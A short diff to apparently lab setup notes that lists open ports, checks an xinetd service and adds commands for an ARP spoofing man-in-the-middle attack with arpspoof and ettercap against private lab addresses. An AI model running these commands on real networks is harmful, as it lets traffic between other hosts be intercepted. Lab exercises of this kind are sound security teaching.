@@ -16,3 +16,12 @@ Check all ports with: sudo lsof -i -P -n
 Check all listening ports with: sudo lsof -i -P -n | grep LISTEN
 
 Ensure that an xinetd service is running on vm3s
+
+Install arpspoof with sudo apt-get install dsniff
+Execute ARP Spoofing attack with command:
+sudo arpspoof -i eth1 -t 192.168.255.22 192.168.255.33 & > /dev/null
+
+
+# Install ettercap (both gtk and text-only)
+# Execute ARP Spoofing attack with command:
+# sudo ettercap -Tqi eth1 -M arp /192.168.255.22/ /192.168.255.33/
